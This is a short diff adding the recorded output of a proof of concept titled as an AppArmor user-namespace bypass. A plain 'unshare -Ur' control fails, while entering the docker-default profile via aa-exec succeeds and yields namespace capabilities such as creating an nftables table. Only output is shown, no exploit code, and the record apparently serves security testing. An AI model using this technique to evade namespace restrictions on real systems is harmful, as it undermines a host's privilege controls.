@@ -1,0 +1,10 @@
+POC-4: AppArmor user-namespace bypass
+--- plain unshare -Ur (control) ---
+unshare: write failed /proc/self/uid_map: Operation not permitted
+--- aa-exec into docker-default ---
+0
+--- namespace capabilities (private netns; no host change) ---
+table inet poc
+0
+--- current apparmor setting ---
+0
